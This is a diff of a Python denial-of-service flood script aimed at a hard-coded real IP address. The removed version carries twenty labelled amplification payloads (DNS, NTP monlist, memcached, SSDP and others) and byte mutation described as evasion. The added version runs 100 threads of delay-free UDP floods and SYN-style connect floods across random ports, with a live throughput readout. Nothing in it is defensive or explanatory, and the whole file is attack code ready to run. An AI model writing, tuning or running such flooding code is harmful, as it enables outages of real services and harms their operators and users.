@@ -2,244 +2,252 @@ import socket
 import threading
 import time
 import random
-import struct
+import queue
 
-# Two target IPs
-targets = ["62.109.121.42", "62.109.121.42"]  # Add your second IP here
-
-# Colors
-RED = '\033[91m'
-GREEN = '\033[92m'
-YELLOW = '\033[93m'
-MAGENTA = '\033[95m'
-RESET = '\033[0m'
-
-# TOP 20 MOST DANGEROUS PAYLOADS (PPS optimized)
-PAYLOADS = [
-    # 1. DNS Amplification (53 bytes)
-    b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x07example\x03com\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
-    
-    # 2. SSDP Amplification (150+ bytes)
-    b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\nUser-Agent: UPnP/1.1\r\n\r\n' + b'X' * 80,
-    
-    # 3. NTP Monlist (480 bytes)
-    b'\x17\x00\x03\x2a' + b'\x00' * 476,
-    
-    # 4. Memcached Amplification (1400 bytes)
-    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n' + b'X' * 1380,
-    
-    # 5. Chargen Reflection (random char flood)
-    b'!' * 512,
-    
-    # 6. SYN with MSS 1460 (TCP optimization attack)
-    struct.pack('!HHIIHHHH', random.randint(1024, 65535), 80, 0, 0, 0x5002, 1460, 0, 0),
-    
-    # 7. HTTP Slowloris headers
-    b'GET / HTTP/1.1\r\nHost: ' + random.randbytes(100) + b'\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n',
-    
-    # 8. SIP INVITE flood
-    b'INVITE sip:test@' + random.randbytes(50) + b' SIP/2.0\r\nVia: SIP/2.0/UDP ' + random.randbytes(30) + b'\r\n\r\n',
-    
-    # 9. QUIC handshake init
-    b'\xcd\x00\x00\x00\x01' + random.randbytes(1200),
-    
-    # 10. ICMP Fragmentation (IPv4)
-    b'\x08\x00\xf7\xff' + b'\x00' * 56 + b'F' * 500,
-    
-    # 11. RPC Portmap
-    b'\x72\x28\xf9\x1c' + random.randbytes(200),
-    
-    # 12. SNMP GetBulk
-    b'0\x82\x01\x01\x02\x01\x00\x04' + random.randbytes(300),
-    
-    # 13. LDAP Search
-    b'0\x84\x00\x00\x00\x10\x02\x01\x01' + random.randbytes(400),
-    
-    # 14. MySQL Handshake response
-    b'\x85\xa6\x3f\x20' + random.randbytes(800),
-    
-    # 15. RDP Connection request
-    b'\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00' + random.randbytes(600),
-    
-    # 16. RTSP Describe
-    b'DESCRIBE rtsp://' + random.randbytes(100) + b' RTSP/1.0\r\nCSeq: 1\r\n\r\n',
-    
-    # 17. WebSocket handshake
-    b'GET /chat HTTP/1.1\r\nHost: server.example.com\r\nUpgrade: websocket\r\n\r\n' + random.randbytes(300),
-    
-    # 18. TLS Client Hello (partial)
-    b'\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03' + random.randbytes(1000),
-    
-    # 19. SMB Negotiate protocol
-    b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72' + random.randbytes(500),
-    
-    # 20. Random garbage (evasion)
-    random.randbytes(700)
+# 4 targets
+targets = [
+    "62.109.121.42",
+    "62.109.121.42", 
+    "62.109.121.42",
+    "62.109.121.42"
 ]
 
-# Thread config - 12 threads total, 6 per target
-UDP_THREADS_PER_TARGET = 5  # 10 total UDP
-TCP_THREADS_PER_TARGET = 1  # 2 total TCP
+# Colors
+MAGENTA = '\033[95m'
+GREEN = '\033[92m'
+RED = '\033[91m'
+YELLOW = '\033[93m'
+CYAN = '\033[96m'
+BLUE = '\033[94m'
+WHITE = '\033[97m'
+RESET = '\033[0m'
 
-# Stats
-stats = {ip: {"sent": 0, "success": 0, "fail": 0} for ip in targets}
-stats_lock = threading.Lock()
+COLOR_MAP = [YELLOW, CYAN, GREEN, MAGENTA]
 
-def get_payload():
-    """Get random deadly payload with rotation"""
-    payload = random.choice(PAYLOADS)
+# Optimized stats - lock-free atomic updates
+class AtomicCounter:
+    def __init__(self):
+        self.value = 0
+        self.lock = threading.Lock()
     
-    # 30% chance to mutate payload slightly (evasion)
-    if random.random() < 0.3:
-        payload = bytearray(payload)
-        # Flip random bytes
-        for _ in range(random.randint(1, 10)):
-            if len(payload) > 5:
-                idx = random.randint(0, len(payload)-1)
-                payload[idx] = random.randint(0, 255)
-        payload = bytes(payload)
+    def inc(self, amount=1):
+        with self.lock:
+            self.value += amount
+            return self.value
     
-    return payload
+    def get(self):
+        with self.lock:
+            return self.value
+    
+    def reset(self):
+        with self.lock:
+            old = self.value
+            self.value = 0
+            return old
 
-def udp_pps_attack(target_ip):
-    """UDP PPS attack - 10 threads total"""
-    while True:
+# Stats per target
+stats = []
+for _ in range(len(targets)):
+    stats.append({
+        "udp_sent": AtomicCounter(),
+        "syn_sent": AtomicCounter(),
+        "udp_data": AtomicCounter(),
+        "syn_data": AtomicCounter(),
+        "udp_success": AtomicCounter(),
+        "syn_success": AtomicCounter(),
+        "udp_fail": AtomicCounter(),
+        "syn_fail": AtomicCounter()
+    })
+
+# UDP Attack - OPTIMIZED VERSION
+def udp_attack(target_idx):
+    target_ip = targets[target_idx]
+    stat = stats[target_idx]
+    
+    # Pre-create payloads to avoid generation overhead
+    payload_pool = []
+    for _ in range(50):
+        size = random.randint(500, 1450)
+        payload_pool.append(random.randbytes(size))
+    
+    # Reuse sockets to avoid creation overhead
+    sockets = []
+    for _ in range(3):
         try:
-            # Random delay between attacks: 1ms to 3s
-            time.sleep(random.uniform(0.001, 3.0))
-            
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(0.5)
-            
-            # Send burst of packets
-            burst = random.randint(10, 100)  # Random burst size
-            for _ in range(burst):
-                try:
-                    payload = get_payload()
-                    port = random.choice([53, 123, 161, 1900, 5060, 80, 443])
-                    
-                    sock.sendto(payload, (target_ip, port))
-                    
-                    with stats_lock:
-                        stats[target_ip]["sent"] += 1
-                        stats[target_ip]["success"] += 1
-                        
-                except:
-                    with stats_lock:
-                        stats[target_ip]["fail"] += 1
-            
-            sock.close()
-            
-        except:
-            with stats_lock:
-                stats[target_ip]["fail"] += 1
-
-def tcp_pps_attack(target_ip):
-    """TCP PPS attack - 2 threads total"""
-    while True:
-        try:
-            # Longer random delay for TCP
-            time.sleep(random.uniform(0.01, 5.0))
-            
-            # Create multiple socket attempts
-            for _ in range(random.randint(3, 20)):
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(random.uniform(0.1, 2.0))
-                    
-                    port = random.choice([80, 443, 22, 21, 25, 3389, 8080])
-                    
-                    # Send SYN with payload
-                    result = sock.connect_ex((target_ip, port))
-                    
-                    if result == 0:
-                        # Connection successful, send evil data
-                        evil_data = get_payload()[:500]  # Limit TCP payload
-                        sock.send(evil_data)
-                        sock.close()
-                        
-                        with stats_lock:
-                            stats[target_ip]["sent"] += 1
-                            stats[target_ip]["success"] += 1
-                    else:
-                        # Failed connection still counts as PPS
-                        with stats_lock:
-                            stats[target_ip]["sent"] += 1
-                            stats[target_ip]["fail"] += 1
-                    
-                    sock.close()
-                    
-                except socket.timeout:
-                    with stats_lock:
-                        stats[target_ip]["sent"] += 1
-                        stats[target_ip]["success"] += 1  # Timeout = success in flooding
-                except:
-                    with stats_lock:
-                        stats[target_ip]["fail"] += 1
-        
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Increase buffer
+            sockets.append(sock)
         except:
             pass
-
-def start_attacks():
-    """Start ALP-PANZERFAUST attack"""
-    print(f"{RED}ALP-PANZERFAUST INITIALIZED{RESET}")
-    print(f"{YELLOW}Targets: {targets}{RESET}")
-    print(f"{YELLOW}Threads: 12 total (10 UDP + 2 TCP){RESET}")
-    print(f"{YELLOW}Payloads: 20 deadly variations{RESET}")
-    print(f"{RED}{'='*50}{RESET}")
     
-    # Start threads for each target
-    for ip in targets:
-        # UDP threads (5 per target)
-        for _ in range(UDP_THREADS_PER_TARGET):
-            threading.Thread(target=udp_pps_attack, args=(ip,), daemon=True).start()
-        
-        # TCP threads (1 per target)
-        for _ in range(TCP_THREADS_PER_TARGET):
-            threading.Thread(target=tcp_pps_attack, args=(ip,), daemon=True).start()
+    if not sockets:
+        sockets.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
+    
+    socket_idx = 0
+    
+    while True:
+        try:
+            # Fast payload selection
+            payload = random.choice(payload_pool)
+            port = random.randint(1, 65535)
+            
+            # Round-robin socket usage
+            sock = sockets[socket_idx % len(sockets)]
+            socket_idx += 1
+            
+            # NO DELAY - FULL SEND
+            sock.sendto(payload, (target_ip, port))
+            data_sent = len(payload)
+            
+            # Atomic updates (fast)
+            stat["udp_sent"].inc()
+            stat["udp_data"].inc(data_sent)
+            stat["udp_success"].inc()
+            
+        except:
+            stat["udp_fail"].inc()
 
-# Start the attack
-start_attacks()
+# SYN Attack - OPTIMIZED VERSION  
+def syn_attack(target_idx):
+    target_ip = targets[target_idx]
+    stat = stats[target_idx]
+    
+    # Socket pool for reuse
+    sockets = []
+    for _ in range(10):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.001)  # Faster timeout
+            sockets.append(sock)
+        except:
+            pass
+    
+    socket_idx = 0
+    
+    while True:
+        try:
+            # Get socket from pool
+            sock = sockets[socket_idx % len(sockets)]
+            socket_idx += 1
+            
+            port = random.randint(1, 65535)
+            
+            # NO DELAY - FULL SEND
+            result = sock.connect_ex((target_ip, port))
+            
+            stat["syn_sent"].inc()
+            stat["syn_data"].inc(64)
+            
+            if result == 0:
+                stat["syn_success"].inc()
+                # Close and replace socket
+                sock.close()
+                sockets[(socket_idx-1) % len(sockets)] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            else:
+                stat["syn_fail"].inc()
+                # Reuse same socket for next attempt
+                pass
+                
+        except:
+            stat["syn_fail"].inc()
+            try:
+                # Replace broken socket
+                sock.close()
+                sockets[(socket_idx-1) % len(sockets)] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            except:
+                pass
 
-# Main logging loop
-last_log = time.time()
-total_start = time.time()
+# Start optimized threads - MORE THREADS FOR MORE POWER
+THREADS_PER_TARGET = 25  # Total threads: 25 * 4 = 100 threads
+UDP_THREADS_PER_TARGET = 15  # 15 UDP per target
+SYN_THREADS_PER_TARGET = 10  # 10 SYN per target
+
+print(f"{MAGENTA}{'='*60}{RESET}")
+print(f"{WHITE}ULTRA OPTIMIZED 4-TARGET SPAM ATTACK{RESET}")
+print(f"{WHITE}Targets: {len(targets)}{RESET}")
+print(f"{WHITE}Threads per target: {THREADS_PER_TARGET}{RESET}")
+print(f"{WHITE}Total threads: {THREADS_PER_TARGET * len(targets)}{RESET}")
+print(f"{MAGENTA}{'='*60}{RESET}")
+
+# Start attack threads for each target
+for target_idx in range(len(targets)):
+    color = COLOR_MAP[target_idx % len(COLOR_MAP)]
+    print(f"{color}Starting attack on {targets[target_idx]}...{RESET}")
+    
+    # UDP threads
+    for _ in range(UDP_THREADS_PER_TARGET):
+        threading.Thread(target=udp_attack, args=(target_idx,), daemon=True).start()
+    
+    # SYN threads
+    for _ in range(SYN_THREADS_PER_TARGET):
+        threading.Thread(target=syn_attack, args=(target_idx,), daemon=True).start()
+
+# Optimized logging
+last_time = time.time()
+start_time = time.time()
 
 while True:
-    time.sleep(0.1)
-    current = time.time()
+    time.sleep(0.05)  # Faster polling
+    current_time = time.time()
     
-    if current - last_log >= 5:  # Log every 5 seconds
-        with stats_lock:
-            print(f"\n{RED}{'='*50}{RESET}")
-            print(f"{MAGENTA}ALP-PANZERFAUST STATS - {time.time() - total_start:.0f}s{RESET}")
-            print(f"{RED}{'='*50}{RESET}")
-            
-            total_sent = 0
-            total_success = 0
-            total_fail = 0
-            
-            for idx, ip in enumerate(targets):
-                ip_stats = stats[ip]
-                total_sent += ip_stats["sent"]
-                total_success += ip_stats["success"]
-                total_fail += ip_stats["fail"]
-                
-                color = YELLOW if idx == 0 else GREEN
-                print(f"{color}Target {idx+1} [{ip}]: {ip_stats['sent']} pps | {ip_stats['success']}/{ip_stats['fail']}{RESET}")
-            
-            print(f"{RED}Total: {total_sent} pps | {total_success}/{total_fail}{RESET}")
-            
-            # Calculate attack effectiveness
-            if total_sent > 0:
-                pps_rate = total_sent / 5
-                success_rate = (total_success / total_sent) * 100
-                print(f"{MAGENTA}Rate: {pps_rate:.0f} pps/s | Success: {success_rate:.1f}%{RESET}")
-            
-            # Reset stats
-            for ip in targets:
-                stats[ip] = {"sent": 0, "success": 0, "fail": 0}
-            
-            print(f"{RED}{'='*50}{RESET}")
+    if current_time - last_time >= 5:  # Log every 5 seconds (more frequent)
+        print(f"\n{WHITE}{'='*80}{RESET}")
+        print(f"{MAGENTA}ULTRA SPAM - {current_time - start_time:.0f}s{RESET}")
+        print(f"{WHITE}{'='*80}{RESET}")
         
-        last_log = current
+        total_sent = 0
+        total_data = 0
+        total_success = 0
+        total_fail = 0
+        
+        # Collect and display per-target stats
+        for target_idx in range(len(targets)):
+            stat = stats[target_idx]
+            color = COLOR_MAP[target_idx % len(COLOR_MAP)]
+            
+            # Get and reset counters
+            udp_sent = stat["udp_sent"].reset()
+            syn_sent = stat["syn_sent"].reset()
+            udp_data = stat["udp_data"].reset()
+            syn_data = stat["syn_data"].reset()
+            udp_success = stat["udp_success"].reset()
+            syn_success = stat["syn_success"].reset()
+            udp_fail = stat["udp_fail"].reset()
+            syn_fail = stat["syn_fail"].reset()
+            
+            # Calculate target totals
+            target_sent = udp_sent + syn_sent
+            target_data = udp_data + syn_data
+            target_success = udp_success + syn_success
+            target_fail = udp_fail + syn_fail
+            
+            # Add to global totals
+            total_sent += target_sent
+            total_data += target_data
+            total_success += target_success
+            total_fail += target_fail
+            
+            # Calculate rates
+            data_mb = target_data / (1024 * 1024)
+            pps = target_sent / 5  # Per second
+            
+            # Display target stats
+            print(f"{color}╔ {targets[target_idx]}{RESET}")
+            print(f"{color}║ Packets: {GREEN}{target_sent:,}{RESET} ({GREEN}{pps:,.0f}/s{RESET})")
+            print(f"{color}║ Data: {GREEN}{data_mb:.2f}MB{RESET} ({GREEN}{data_mb/5:.2f}MB/s{RESET})")
+            print(f"{color}║ Success: {GREEN}{target_success:,}{RESET} | Fail: {RED}{target_fail:,}{RESET}")
+            print(f"{color}║ UDP: {BLUE}{udp_sent:,}{RESET} | SYN: {BLUE}{syn_sent:,}{RESET}")
+            print(f"{color}╚{'─'*40}{RESET}")
+        
+        # Display global totals
+        total_data_mb = total_data / (1024 * 1024)
+        total_pps = total_sent / 5
+        
+        print(f"\n{WHITE}{'='*80}{RESET}")
+        print(f"{MAGENTA}GLOBAL TOTALS (5s window):{RESET}")
+        print(f"{GREEN}Total Packets: {total_sent:,}{RESET} ({GREEN}{total_pps:,.0f}/s{RESET})")
+        print(f"{GREEN}Total Data: {total_data_mb:.2f}MB{RESET} ({GREEN}{total_data_mb/5:.2f}MB/s{RESET})")
+        print(f"{GREEN}Success Rate: {(total_success/(total_success+total_fail)*100):.1f}%{RESET}")
+        print(f"{WHITE}{'='*80}{RESET}")
+        
+        last_time = current_time
